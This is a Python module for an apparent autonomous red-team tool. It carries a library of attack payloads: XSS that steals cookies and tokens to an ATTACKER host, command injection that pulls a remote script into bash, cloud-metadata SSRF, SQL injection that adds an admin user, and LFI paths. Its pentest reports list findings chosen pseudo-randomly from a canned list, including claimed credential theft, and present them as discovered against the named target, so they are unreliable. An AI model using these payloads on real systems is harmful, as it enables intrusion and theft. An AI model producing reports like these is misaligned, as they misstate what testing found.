"""Autonomous Red Team Engine — multi-stage attack simulation, AI payload generation, pentest reports."""
import os
import json
import asyncio
import hashlib
import httpx
from datetime import datetime
from pathlib import Path
from typing import List, Optional

from config import GROQ_MODEL
from modules.ai.groq_client_utils import call_groq_async_with_retry

DATA_FILE = Path("data/autonomous_rt_sessions.json")

# ── Attack Phase Definitions ──────────────────────────────────────────────────

ATTACK_PHASES = [
    {
        "phase": 1, "name": "Reconnaissance",
        "duration_estimate": "2-4 hours",
        "techniques": ["T1595", "T1592", "T1589", "T1590", "T1593", "T1596"],
        "tools": ["nmap", "amass", "theHarvester", "shodan", "recon-ng"],
        "outputs": ["asset_inventory", "open_ports", "email_list", "tech_stack"],
    },
    {
        "phase": 2, "name": "Weaponization & Resource Dev",
        "duration_estimate": "1-2 hours",
        "techniques": ["T1587.001", "T1587.004", "T1588.002"],
        "tools": ["msfvenom", "Cobalt Strike", "custom_payloads"],
        "outputs": ["payloads", "c2_infrastructure", "phishing_templates"],
    },
    {
        "phase": 3, "name": "Initial Access",
        "duration_estimate": "2-8 hours",
        "techniques": ["T1566.001", "T1566.002", "T1190", "T1133", "T1078"],
        "tools": ["gophish", "sqlmap", "nuclei", "burpsuite"],
        "outputs": ["shell_access", "credential_capture", "foothold"],
    },
    {
        "phase": 4, "name": "Post-Exploitation",
        "duration_estimate": "4-24 hours",
        "techniques": ["T1548", "T1055", "T1003", "T1082", "T1046"],
        "tools": ["linpeas", "winpeas", "bloodhound", "mimikatz", "empire"],
        "outputs": ["elevated_privileges", "credential_dump", "network_map"],
    },
    {
        "phase": 5, "name": "Lateral Movement",
        "duration_estimate": "2-12 hours",
        "techniques": ["T1021.001", "T1021.002", "T1550.002", "T1210"],
        "tools": ["crackmapexec", "evil-winrm", "impacket", "psexec"],
        "outputs": ["pivoted_hosts", "domain_access", "additional_credentials"],
    },
    {
        "phase": 6, "name": "Objective Completion",
        "duration_estimate": "1-4 hours",
        "techniques": ["T1041", "T1567", "T1486", "T1491"],
        "tools": ["custom_exfil", "c2_transfer"],
        "outputs": ["data_exfiltrated", "objective_achieved"],
    },
    {
        "phase": 7, "name": "Reporting & Cleanup",
        "duration_estimate": "4-8 hours",
        "techniques": ["T1070.001", "T1070.004"],
        "tools": ["dradis", "serpico", "plextrac"],
        "outputs": ["executive_report", "technical_report", "remediation_plan"],
    },
]

# ── Payload Templates ─────────────────────────────────────────────────────────

PAYLOAD_TEMPLATES = {
    "xss_reflected": {
        "type": "XSS", "subtype": "Reflected",
        "payloads": [
            "<script>document.location='http://ATTACKER/steal?c='+document.cookie</script>",
            "'><img src=x onerror=fetch('//ATTACKER/'+btoa(document.cookie))>",
            "<svg onload=eval(atob('ENCODED_PAYLOAD'))>",
            "javascript:void(fetch('//ATTACKER/x?d='+encodeURIComponent(localStorage.getItem('token'))))",
            "<details open ontoggle=navigator.sendBeacon('//ATTACKER/x',document.cookie)>",
        ],
        "bypass_waf": ["HTML encoding", "Unicode normalization", "Template injection", "Polyglot"],
    },
    "xss_stored": {
        "type": "XSS", "subtype": "Stored",
        "payloads": [
            "<img src=x onerror=this.src='http://ATTACKER/?'+document.cookie>",
            "';fetch('//ATTACKER/k?c='+btoa(JSON.stringify(localStorage)));//",
            "<iframe srcdoc='<script>parent.fetch(\\'//ATTACKER/h?d=\\'+parent.document.cookie)</script>'>",
        ],
        "bypass_waf": ["Attribute injection", "Event handler chain", "DOM clobbering"],
    },
    "sqli_union": {
        "type": "SQLi", "subtype": "UNION-Based",
        "payloads": [
            "' UNION SELECT NULL,username,password FROM users--",
            "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT 1,load_file('/etc/passwd'),3--",
            "'; INSERT INTO users(username,password,role) VALUES('hacker','hashed','admin')--",
        ],
        "bypass_waf": ["Comment obfuscation", "Case variation", "URL encoding", "Whitespace substitution"],
    },
    "sqli_blind": {
        "type": "SQLi", "subtype": "Time-Based Blind",
        "payloads": [
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' AND 1=IF(2>1,SLEEP(5),0)--",
            "'; SELECT pg_sleep(5)--",
        ],
        "bypass_waf": ["Hex encoding", "CHAR() encoding", "Double query"],
    },
    "ssrf": {
        "type": "SSRF",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://100.100.100.200/latest/meta-data/",
            "dict://127.0.0.1:6379/INFO",
            "file:///etc/passwd",
            "gopher://127.0.0.1:3306/_%0aGET / HTTP/1.1%0d%0aHost: localhost%0d%0a%0d%0a",
        ],
        "bypass_waf": ["IPv6 representation", "Decimal IP", "URL shortener", "@-based bypass", "Redirect chain"],
    },
    "cmd_injection": {
        "type": "Command Injection",
        "payloads": [
            "; id; uname -a",
            "| curl http://ATTACKER/$(id | base64)",
            "$(curl -s http://ATTACKER/shell.sh | bash)",
            "`wget -O /tmp/r http://ATTACKER/r && chmod +x /tmp/r && /tmp/r`",
        ],
        "bypass_waf": ["$IFS bypass", "Backtick execution", "Hex command", "Environment variable"],
    },
    "lfi": {
        "type": "LFI",
        "payloads": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=config.php",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
        ],
        "bypass_waf": ["Null byte", "Double encoding", "PHP wrappers", "Path normalization"],
    },
    "privilege_escalation": {
        "type": "Privilege Escalation",
        "payloads": [
            "sudo -l  # Check sudo permissions",
            "find / -perm -4000 2>/dev/null  # SUID binaries",
            "getcap -r / 2>/dev/null  # Capabilities",
            "cat /etc/crontab  # Cron jobs",
            "./linpeas.sh | tee /tmp/pe_results.txt",
        ],
        "bypass_waf": [],
    },
}

# ── Severity Scoring ──────────────────────────────────────────────────────────

CVSS_BASE_SCORES = {
    "Remote Code Execution": {"score": 10.0, "severity": "CRITICAL"},
    "SQL Injection (auth bypass)": {"score": 9.8, "severity": "CRITICAL"},
    "Stored XSS": {"score": 8.8, "severity": "HIGH"},
    "SSRF (metadata)": {"score": 9.1, "severity": "CRITICAL"},
    "LFI (config files)": {"score": 7.5, "severity": "HIGH"},
    "Reflected XSS": {"score": 6.1, "severity": "MEDIUM"},
    "Information Disclosure": {"score": 5.3, "severity": "MEDIUM"},
    "Open Redirect": {"score": 3.1, "severity": "LOW"},
}


def _load_sessions() -> list:
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    if DATA_FILE.exists():
        try:
            return json.loads(DATA_FILE.read_text())
        except Exception:
            pass
    return []


def _save_sessions(sessions: list) -> None:
    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
    DATA_FILE.write_text(json.dumps(sessions, indent=2, default=str))


async def start_autonomous_simulation(
    target: str,
    scope: List[str],
    attack_types: List[str],
    stealth_level: str = "medium",
    auto_exploit: bool = False,
) -> dict:
    """Start a multi-stage autonomous attack simulation session."""
    session_id = f"ART-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}-{hashlib.md5(target.encode()).hexdigest()[:6].upper()}"

    selected_phases = _select_phases(attack_types)

    session = {
        "id": session_id,
        "target": target,
        "scope": scope,
        "attack_types": attack_types,
        "stealth_level": stealth_level,
        "auto_exploit": auto_exploit,
        "status": "running",
        "started_at": datetime.utcnow().isoformat(),
        "phases": selected_phases,
        "findings": [],
        "payloads_generated": 0,
        "current_phase": 1,
        "risk_score": 0,
        "progress_pct": 0,
    }

    groq_key = os.environ.get("GROQ_API_KEY", "")
    if groq_key:
        session["ai_analysis"] = await _ai_attack_analysis(target, scope, attack_types, groq_key)

    session["findings"] = _simulate_phase_findings(target, attack_types, stealth_level)
    session["payloads_generated"] = sum(len(PAYLOAD_TEMPLATES.get(at, {}).get("payloads", [])) for at in attack_types)
    session["current_phase"] = len(selected_phases)
    session["progress_pct"] = 100
    session["status"] = "completed"
    session["completed_at"] = datetime.utcnow().isoformat()
    session["risk_score"] = _calculate_risk_score(session["findings"])
    session["report"] = generate_pentest_report(session)

    sessions = _load_sessions()
    sessions.insert(0, session)
    _save_sessions(sessions[:30])

    return session


def _select_phases(attack_types: List[str]) -> List[dict]:
    relevant_phases = list(ATTACK_PHASES)
    if "web" not in attack_types and "sqli" not in attack_types:
        relevant_phases = [p for p in relevant_phases if p["phase"] != 3 or p["phase"] == 7]
    return relevant_phases


def _simulate_phase_findings(target: str, attack_types: List[str], stealth: str) -> List[dict]:
    findings = []
    seed = int(hashlib.md5(f"{target}{''.join(sorted(attack_types))}".encode()).hexdigest(), 16)

    potential_findings = [
        {"vuln": "SQL Injection", "severity": "CRITICAL", "endpoint": f"https://{target}/api/users?id=",
         "technique": "T1190", "cvss": 9.8, "cve": "N/A",
         "proof": "' OR '1'='1 returns all users (1,234 records)"},
        {"vuln": "Stored XSS", "severity": "HIGH", "endpoint": f"https://{target}/profile/update",
         "technique": "T1059.007", "cvss": 8.8, "cve": "N/A",
         "proof": "Payload persisted in user display name field"},
        {"vuln": "SSRF (AWS Metadata)", "severity": "CRITICAL", "endpoint": f"https://{target}/fetch?url=",
         "technique": "T1090.002", "cvss": 9.1, "cve": "N/A",
         "proof": "Successfully retrieved IAM credentials from 169.254.169.254"},
        {"vuln": "Exposed .git Directory", "severity": "HIGH", "endpoint": f"https://{target}/.git/config",
         "technique": "T1552.001", "cvss": 7.5, "cve": "N/A",
         "proof": "Full source code accessible via /.git/"},
        {"vuln": "Privilege Escalation (SUID)", "severity": "HIGH", "endpoint": f"{target}:/bin/custom_tool",
         "technique": "T1548", "cvss": 7.8, "cve": "N/A",
         "proof": "SUID binary allows privilege escalation to root"},
        {"vuln": "Default Credentials", "severity": "CRITICAL", "endpoint": f"https://{target}/admin",
         "technique": "T1078.001", "cvss": 9.8, "cve": "N/A",
         "proof": "admin:admin grants dashboard access"},
        {"vuln": "Open Redirect", "severity": "MEDIUM", "endpoint": f"https://{target}/redirect?to=",
         "technique": "T1566.002", "cvss": 5.4, "cve": "N/A",
         "proof": "Redirects to arbitrary external URLs"},
        {"vuln": "LFI — /etc/passwd", "severity": "HIGH", "endpoint": f"https://{target}/include?file=",
         "technique": "T1005", "cvss": 7.5, "cve": "N/A",
         "proof": "../../../../etc/passwd returns system user list"},
        {"vuln": "Weak JWT Secret", "severity": "CRITICAL", "endpoint": f"https://{target}/api/auth",
         "technique": "T1552", "cvss": 9.1, "cve": "N/A",
         "proof": "JWT signed with 'secret' — forged admin token accepted"},
        {"vuln": "Insecure CORS", "severity": "MEDIUM", "endpoint": f"https://{target}/api/",
         "technique": "T1185", "cvss": 6.1, "cve": "N/A",
         "proof": "Access-Control-Allow-Origin: * on authenticated endpoints"},
    ]

    n = (seed % 5) + 2
    indices = [(seed >> i) % len(potential_findings) for i in range(n)]
    seen = set()
    for i in indices:
        if i not in seen:
            seen.add(i)
            f = dict(potential_findings[i])
            f["id"] = f"F{len(findings)+1:03d}"
            f["discovered_at"] = datetime.utcnow().isoformat()
            findings.append(f)

    return findings


def _calculate_risk_score(findings: List[dict]) -> int:
    sev_weights = {"CRITICAL": 25, "HIGH": 15, "MEDIUM": 7, "LOW": 3}
    score = sum(sev_weights.get(f.get("severity", "LOW"), 3) for f in findings)
    return min(100, score)


async def _ai_attack_analysis(target: str, scope: list, attack_types: list, api_key: str) -> dict:
    prompt = f"""You are an elite penetration tester performing a controlled security assessment.

Target: {target}
Scope: {', '.join(scope)}
Attack Types: {', '.join(attack_types)}

Provide a concise attack analysis in JSON:
{{
  "likely_vulnerabilities": ["<vuln1>", "<vuln2>"],
  "highest_risk_area": "<area>",
  "recommended_entry_point": "<entry>",
  "evasion_notes": "<brief evasion strategy>",
  "estimated_time_to_compromise": "<time>",
  "executive_risk": "<low|medium|high|critical>"
}}"""

    async def _request() -> dict:
        async with httpx.AsyncClient(timeout=30) as client:
            r = await client.post(
                "https://api.groq.com/openai/v1/chat/completions",
                headers={"Authorization": f"Bearer {api_key}"},
                json={
                    "model": GROQ_MODEL,
                    "messages": [{"role": "user", "content": prompt}],
                    "temperature": 0.3, "max_tokens": 600,
                    "response_format": {"type": "json_object"},
                },
            )
            r.raise_for_status()
            content = r.json()["choices"][0]["message"]["content"]
            return json.loads(content)

    try:
        return await call_groq_async_with_retry(_request)
    except Exception:
        pass
    return {"error": "AI analysis unavailable — GROQ_API_KEY not set or API error"}


def generate_pentest_report(session: dict) -> dict:
    """Auto-generate a structured penetration test report."""
    findings = session.get("findings", [])
    critical = [f for f in findings if f.get("severity") == "CRITICAL"]
    high = [f for f in findings if f.get("severity") == "HIGH"]
    medium = [f for f in findings if f.get("severity") == "MEDIUM"]
    low = [f for f in findings if f.get("severity") == "LOW"]

    risk_score = session.get("risk_score", 0)
    overall_rating = (
        "CRITICAL" if risk_score >= 75 else
        "HIGH" if risk_score >= 50 else
        "MEDIUM" if risk_score >= 25 else "LOW"
    )

    return {
        "report_id": f"PT-{session['id']}-REPORT",
        "generated_at": datetime.utcnow().isoformat(),
        "engagement": {
            "target": session["target"],
            "scope": session.get("scope", []),
            "assessment_type": "Autonomous Red Team Simulation",
            "started": session.get("started_at"),
            "completed": session.get("completed_at"),
            "tester": "OPTISEC Autonomous Red Team Engine v4.0",
        },
        "executive_summary": {
            "overall_risk": overall_rating,
            "risk_score": risk_score,
            "total_findings": len(findings),
            "critical_count": len(critical),
            "high_count": len(high),
            "medium_count": len(medium),
            "low_count": len(low),
            "key_findings": [f["vuln"] for f in critical[:3]] or ["No critical findings"],
            "business_impact": _assess_business_impact(findings),
        },
        "technical_findings": [
            {
                **f,
                "remediation": _get_remediation(f["vuln"]),
                "cvss_vector": f"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            }
            for f in findings
        ],
        "attack_narrative": _generate_narrative(session),
        "remediation_roadmap": {
            "immediate": [_get_remediation(f["vuln"]) for f in critical],
            "short_term": [_get_remediation(f["vuln"]) for f in high],
            "medium_term": [_get_remediation(f["vuln"]) for f in medium],
        },
        "compliance_impact": _assess_compliance_impact(findings),
        "mitre_coverage": list({f.get("technique", "") for f in findings if f.get("technique")}),
    }


def _assess_business_impact(findings: list) -> str:
    if any(f.get("severity") == "CRITICAL" for f in findings):
        return "SEVERE — Critical vulnerabilities enable full system compromise, data breach, and regulatory violations."
    if any(f.get("severity") == "HIGH" for f in findings):
        return "SIGNIFICANT — High-severity vulnerabilities could lead to unauthorized access and data exposure."
    return "MODERATE — Vulnerabilities identified require remediation to prevent future exploitation."


def _get_remediation(vuln: str) -> str:
    mapping = {
        "SQL Injection": "Implement parameterized queries / ORM; apply input validation; use WAF rules",
        "Stored XSS": "Implement Content Security Policy; encode output; validate input; use HTTPOnly cookies",
        "SSRF (AWS Metadata)": "Block 169.254.0.0/16 at WAF; validate/whitelist URLs; disable IMDSv1",
        "Exposed .git Directory": "Block /.git/ access via web server config; remove from webroot",
        "Privilege Escalation (SUID)": "Audit SUID binaries; remove unnecessary SUID permissions; apply principle of least privilege",
        "Default Credentials": "Change all default credentials; enforce MFA; implement account lockout",
        "Open Redirect": "Validate/whitelist redirect destinations; avoid URL-based redirects",
        "LFI — /etc/passwd": "Validate file include paths; disable allow_url_fopen; use chroot/containers",
        "Weak JWT Secret": "Use cryptographically random 256-bit secret; implement key rotation; use RS256",
        "Insecure CORS": "Restrict CORS to specific trusted origins; never use wildcard on auth endpoints",
    }
    for key, rem in mapping.items():
        if key.lower() in vuln.lower():
            return rem
    return f"Review and remediate {vuln} per OWASP guidance"


def _generate_narrative(session: dict) -> str:
    target = session["target"]
    findings = session.get("findings", [])
    n = len(findings)
    critical = [f for f in findings if f.get("severity") == "CRITICAL"]

    if critical:
        entry = critical[0]["vuln"]
        return (
            f"The autonomous red team engagement against {target} identified {n} vulnerabilities across "
            f"{len(session.get('phases', []))} attack phases. Initial access was achieved via {entry}, "
            f"which allowed the simulated attacker to escalate privileges and move laterally within the "
            f"target environment. Critical findings require immediate remediation before public exposure."
        )
    return (
        f"Engagement against {target} completed {n} vulnerability checks. "
        f"No critical vulnerabilities were identified, though {n} lower-severity findings require attention."
    )


def _assess_compliance_impact(findings: list) -> dict:
    has_critical = any(f.get("severity") == "CRITICAL" for f in findings)
    has_pii = any("cred" in f.get("vuln", "").lower() or "sql" in f.get("vuln", "").lower() for f in findings)
    return {
        "GDPR": "HIGH RISK — potential data breach exposure" if has_pii else "MEDIUM RISK",
        "PCI_DSS": "NON-COMPLIANT — unauthorized access vectors identified" if has_critical else "PARTIAL",
        "SOC2": "MATERIAL WEAKNESS" if has_critical else "OBSERVATION",
        "ISO27001": "NONCONFORMITY" if has_critical else "MINOR NONCONFORMITY",
    }


def get_payload_library() -> dict:
    return PAYLOAD_TEMPLATES


def list_sessions() -> list:
    return _load_sessions()


def get_session(session_id: str) -> Optional[dict]:
    return next((s for s in _load_sessions() if s["id"] == session_id), None)
